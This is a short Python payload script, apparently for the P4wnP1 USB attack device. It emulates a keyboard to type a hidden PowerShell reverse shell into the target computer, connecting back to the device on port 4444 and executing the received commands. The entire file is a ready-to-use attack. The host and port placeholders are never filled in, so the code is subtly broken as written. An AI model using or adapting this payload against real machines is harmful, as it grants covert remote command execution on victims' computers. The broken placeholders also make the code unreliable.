# File: /opt/p4wnp1/payloads/hid/reverse_shell_inject.py
from tools import hid_type
from payloads.lib.netutil import primary_ip
host = primary_ip()
port = 4444


print("[*] Injecting reverse shell payload into HID interface")
payload = (
    "powershell -w hidden -nop -c \"$client = New-Object Net.Sockets.TCPClient('{host}',{port});"
    "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length)}\""
)
hid_type.type_string(payload)
